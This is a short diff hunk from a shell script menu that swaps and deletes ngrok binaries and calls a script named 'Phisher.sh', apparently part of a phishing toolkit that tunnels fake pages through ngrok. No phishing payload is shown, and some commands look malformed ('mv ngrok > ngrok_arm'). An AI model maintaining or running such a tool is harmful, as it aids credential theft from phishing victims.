@@ -39,9 +39,9 @@ do
    sudo rm ngrok_arm
    ./Phisher.sh
    mv ngrok > ngrok_arm
+   sudo rm ngrok
    mv ngrok2 > ngrok
    sudo rm ngrok2
-   sudo rm ngrok
  
   break
         ;;
